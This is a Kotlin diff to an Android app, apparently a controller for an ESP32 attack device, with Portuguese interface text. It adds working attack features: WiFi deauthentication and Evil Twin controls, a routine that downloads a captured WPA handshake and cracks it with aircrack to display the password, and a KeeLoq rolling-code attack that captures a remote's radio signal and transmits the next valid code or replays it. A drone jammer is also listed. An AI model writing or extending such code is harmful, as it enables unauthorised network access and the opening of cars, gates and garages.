@@ -1,6 +1,7 @@
 package com.crazycat.app
 
 import android.os.Bundle
+import java.io.File
 import android.view.View
 import android.widget.LinearLayout
 import android.widget.TextView
@@ -8,7 +9,10 @@ import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.lifecycle.lifecycleScope
 import com.crazycat.app.api.Esp32Client
+import com.crazycat.app.tools.AircrackRunner
+import com.crazycat.app.tools.SubGhzProcessor
 import kotlinx.coroutines.launch
+import org.json.JSONObject
 
 class ToolsActivity : AppCompatActivity() {
 
@@ -73,8 +77,13 @@ class ToolsActivity : AppCompatActivity() {
                     Esp32Client.cc1101Replay(0)
                 }
                 btn3.visibility = View.VISIBLE
-                setupCard(btn3, tv3, "Ver Sinais", "cc1101_signals") {
-                    Esp32Client.cc1101GetSignals() != null
+                setupCard(btn3, tv3, "Rolling Code", "rolling_code") {
+                    rollingCodeAttack()
+                }
+                btn4.visibility = View.VISIBLE
+                setupCard(btn4, tv4, "Ver Sinais", "cc1101_signals") {
+                    val result = Esp32Client.cc1101GetSignals()
+                    result != null
                 }
             }
             "NRF24" -> {
@@ -101,13 +110,19 @@ class ToolsActivity : AppCompatActivity() {
                     Esp32Client.deauthStart(0)
                 }
                 btn3.visibility = View.VISIBLE
-                setupCard(btn3, tv3, "Parar Deauth", "deauth_stop", Esp32Client::deauthStop)
-                btn4.visibility = View.VISIBLE
-                setupCard(btn4, tv4, "Evil Twin (id=0)", "eviltwin") {
+                setupCard(btn3, tv3, "Evil Twin (id=0)", "eviltwin") {
                     Esp32Client.eviltwinStart(0)
                 }
+                btn4.visibility = View.VISIBLE
+                setupCard(btn4, tv4, "Crack Senha", "crack") {
+                    crackHandshake()
+                }
                 btn5.visibility = View.VISIBLE
-                setupCard(btn5, tv5, "Parar Evil Twin", "eviltwin_stop", Esp32Client::eviltwinStop)
+                setupCard(btn5, tv5, "Parar WiFi", "wifi_stop") {
+                    Esp32Client.deauthStop()
+                    Esp32Client.eviltwinStop()
+                    true
+                }
             }
             "ATTACKS" -> {
                 setupCard(btn1, tv1, "Drone Jammer", "drone_jammer", Esp32Client::droneJammerStart)
@@ -127,6 +142,92 @@ class ToolsActivity : AppCompatActivity() {
                     true
                 }
             }
+        }
+    }
+
+    // === CRACK HANDSHAKE (AIRCRACK) ===
+    // 1. Verifica se tem handshake  2. Baixa PCAP  3. Roda aircrack
+    private suspend fun crackHandshake(): Boolean {
+        try {
+            // Passo 1: Verificar se tem handshake capturado
+            val statusJson = Esp32Client.handshakeStatus() ?: run {
+                runOnUiThread { Toast.makeText(this, "ESP32 fora do alcance", Toast.LENGTH_SHORT).show() }
+                return false
+            }
+            val status = JSONObject(statusJson)
+            val complete = status.optBoolean("complete", false)
+            val frames = status.optInt("frames", 0)
+
+            if (!complete || frames == 0) {
+                runOnUiThread { Toast.makeText(this, "Nenhum handshake capturado. Use Evil Twin primeiro!", Toast.LENGTH_LONG).show() }
+                return false
+            }
+
+            // Passo 2: Baixar PCAP
+            val pcapFile = File(filesDir, "handshake.pcap")
+            runOnUiThread { Toast.makeText(this, "Baixando handshake ($frames frames)...", Toast.LENGTH_SHORT).show() }
+            val downloaded = Esp32Client.handshakeDownload(pcapFile)
+            if (!downloaded || !pcapFile.exists()) {
+                runOnUiThread { Toast.makeText(this, "Falha ao baixar PCAP", Toast.LENGTH_SHORT).show() }
+                return false
+            }
+
+            // Passo 3: Rodar aircrack
+            runOnUiThread { Toast.makeText(this, "Rodando aircrack... aguarde", Toast.LENGTH_LONG).show() }
+            AircrackRunner.crackHandshake(this, pcapFile) { foundKey ->
+                if (foundKey != null) {
+                    Toast.makeText(this@ToolsActivity, "SENHA ENCONTRADA: $foundKey", Toast.LENGTH_LONG).show()
+                } else {
+                    Toast.makeText(this@ToolsActivity, "Senha nao encontrada na wordlist", Toast.LENGTH_LONG).show()
+                }
+            }
+            return true
+        } catch (e: Exception) {
+            runOnUiThread { Toast.makeText(this, "Erro: ${e.message}", Toast.LENGTH_SHORT).show() }
+            return false
+        }
+    }
+
+    // === ROLLING CODE (KEELOQ) ===
+    // 1. Pega sinal bruto do ESP32  2. Processa com Keeloq  3. Transmite proximo codigo
+    private suspend fun rollingCodeAttack(): Boolean {
+        try {
+            // Passo 1: Pegar sinal capturado (id=0)
+            val rawJson = Esp32Client.cc1101GetRaw(0) ?: run {
+                runOnUiThread { Toast.makeText(this, "Nenhum sinal capturado. Use Copy primeiro!", Toast.LENGTH_LONG).show() }
+                return false
+            }
+
+            val json = JSONObject(rawJson)
+            val frequency = json.getLong("frequency")
+            val length = json.getInt("length")
+            val timingsArray = json.getJSONArray("timings")
+            val timings = mutableListOf<Int>()
+            for (i in 0 until length) {
+                timings.add(timingsArray.getInt(i))
+            }
+
+            if (timings.size < 4) {
+                runOnUiThread { Toast.makeText(this, "Sinal muito curto", Toast.LENGTH_SHORT).show() }
+                return false
+            }
+
+            // Passo 2: Processar com Keeloq / Rolling Code
+            val result = SubGhzProcessor.processRollingCode(timings)
+            if (result == null) {
+                // Sem protocolo Keeloq reconhecido, faz replay direto
+                runOnUiThread { Toast.makeText(this, "Protocolo fixo - fazendo replay", Toast.LENGTH_SHORT).show() }
+                return Esp32Client.cc1101Replay(0)
+            }
+
+            val (protocol, newTimings) = result
+            runOnUiThread { Toast.makeText(this, "${protocol.name} - Transmitindo proximo codigo!", Toast.LENGTH_LONG).show() }
+
+            // Passo 3: Transmitir o novo codigo gerado
+            return Esp32Client.cc1101TransmitRaw(protocol.frequency, newTimings)
+        } catch (e: Exception) {
+            runOnUiThread { Toast.makeText(this, "Erro: ${e.message}", Toast.LENGTH_SHORT).show() }
+            return false
         }
     }
 
